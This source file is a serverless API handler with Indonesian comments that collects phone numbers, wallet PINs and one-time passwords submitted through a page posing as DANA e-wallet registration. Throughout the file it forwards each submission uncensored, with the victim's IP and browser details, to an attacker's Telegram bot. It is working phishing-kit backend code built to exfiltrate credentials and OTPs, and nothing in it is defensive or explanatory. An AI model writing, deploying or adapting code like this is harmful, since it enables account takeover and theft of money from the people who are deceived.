// api/send-dana-data.js
const axios = require('axios');

// Fungsi untuk mengirim notifikasi ke Telegram dengan debugging detail
async function sendToTelegram(data) {
  // Gunakan environment variables dari Vercel
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  console.log('Telegram Environment Variables:', {
    hasToken: !!botToken,
    hasChatId: !!chatId,
    tokenLength: botToken ? botToken.length : 0,
    chatId: chatId || 'not set'
  });
  
  if (!botToken || !chatId) {
    console.log('ERROR: Telegram credentials not set in environment variables');
    return false;
  }

  try {
    let message = '';
    
    // Format notifikasi berdasarkan type - TANPA SENSOR
    if (data.type === 'phone') {
      message = `🔔 New DANA Registration\n\n` +
                `├───────────────────\n` +
                `├• NO HP : ${data.phone}\n` +
                `├• IP Address : ${data.ip || 'Unknown'}\n` +
                `├• User Agent : ${data.userAgent || 'Unknown'}\n` +
                `├• Time : ${new Date().toLocaleString('id-ID')}\n` +
                `╰───────────────────`;
    } 
    else if (data.type === 'pin') {
      message = `🔔 New DANA PIN Verification\n\n` +
                `├───────────────────\n` +
                `├• NO HP : ${data.phone}\n` +
                `├• PIN : ${data.pin}\n` +
                `├• IP Address : ${data.ip || 'Unknown'}\n` +
                `├• User Agent : ${data.userAgent || 'Unknown'}\n` +
                `├• Time : ${new Date().toLocaleString('id-ID')}\n` +
                `╰───────────────────`;
    }
    else if (data.type === 'otp') {
      message = `🔔 New DANA OTP Verification\n\n` +
                `├───────────────────\n` +
                `├• NO HP : ${data.phone}\n` +
                `├• PIN : ${data.pin}\n` +
                `├• OTP : ${data.otp}\n` +
                `├• IP Address : ${data.ip || 'Unknown'}\n` +
                `├• User Agent : ${data.userAgent || 'Unknown'}\n` +
                `├• Time : ${new Date().toLocaleString('id-ID')}\n` +
                `╰───────────────────`;
    }

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    
    console.log('Sending to Telegram:', {
      url: url.replace(botToken, 'TOKEN_HIDDEN'),
      chatId: chatId,
      messageLength: message.length
    });
    
    const response = await axios.post(url, {
      chat_id: chatId,
      text: message,
      parse_mode: null
    });
    
    console.log('Telegram API Response:', response.data);
    console.log('✅ Telegram notification sent successfully');
    return true;
  } catch (error) {
    console.error('❌ Error sending to Telegram:');
    if (error.response) {
      console.error('Status:', error.response.status);
      console.error('Data:', error.response.data);
    } else if (error.request) {
      console.error('No response received:', error.request);
    } else {
      console.error('Error message:', error.message);
    }
    return false;
  }
}

// Main function
module.exports = async (req, res) => {
  console.log('=== INCOMING REQUEST ===');
  console.log('Method:', req.method);
  console.log('Headers:', req.headers);
  console.log('Body:', req.body);

  // Set CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, DELETE');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

  // Handle preflight request
  if (req.method === 'OPTIONS') {
    console.log('Handling OPTIONS preflight request');
    return res.status(200).end();
  }

  // Only allow POST requests
  if (req.method !== 'POST') {
    console.log('Method not allowed:', req.method);
    return res.status(405).json({ 
      success: false, 
      error: 'Method not allowed. Only POST requests are accepted.' 
    });
  }

  try {
    // Parse JSON body
    let body;
    try {
      body = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
      console.log('Parsed body:', body);
    } catch (parseError) {
      console.error('JSON parse error:', parseError);
      return res.status(400).json({ 
        success: false, 
        error: 'Invalid JSON format in request body' 
      });
    }

    const { type, phone, pin, otp } = body;

    // Validasi data yang diperlukan
    if (!type) {
      console.error('Missing type field');
      return res.status(400).json({ 
        success: false, 
        error: 'Missing required field: type' 
      });
    }

    // Log data yang diterima
    console.log('📩 Received data:', { type, phone, pin, otp });

    // Proses data berdasarkan type
    let telegramResult = false;
    
    switch (type) {
      case 'phone':
        if (!phone || phone.length < 10) {
          console.error('Invalid phone number:', phone);
          return res.status(400).json({ 
            success: false, 
            error: 'Invalid phone number' 
          });
        }
        
        telegramResult = await sendToTelegram({
          type: 'phone',
          phone: phone,
          userAgent: req.headers['user-agent'],
          ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress
        });
        break;

      case 'pin':
        if (!pin || pin.length !== 6) {
          console.error('Invalid PIN:', pin);
          return res.status(400).json({ 
            success: false, 
            error: 'PIN must be 6 digits' 
          });
        }
        
        telegramResult = await sendToTelegram({
          type: 'pin',
          phone: phone,
          pin: pin,
          userAgent: req.headers['user-agent'],
          ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress
        });
        break;

      case 'otp':
        if (!otp || otp.length !== 4) {
          console.error('Invalid OTP:', otp);
          return res.status(400).json({ 
            success: false, 
            error: 'OTP must be 4 digits' 
          });
        }
        
        telegramResult = await sendToTelegram({
          type: 'otp',
          phone: phone,
          pin: pin,
          otp: otp,
          userAgent: req.headers['user-agent'],
          ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress
        });
        break;

      default:
        console.error('Invalid type:', type);
        return res.status(400).json({ 
          success: false, 
          error: 'Invalid type. Must be: phone, pin, or otp' 
        });
    }

    console.log('Final Telegram result:', telegramResult);

    // Response sukses
    return res.status(200).json({ 
      success: true, 
      message: 'Data processed successfully',
      telegramSent: telegramResult,
      data: {
        type,
        timestamp: new Date().toISOString()
      }
    });

  } catch (error) {
    console.error('❌ Server error:', error);
    return res.status(500).json({ 
      success: false, 
      error: 'Internal server error',
      message: error.message
    });
  }
};
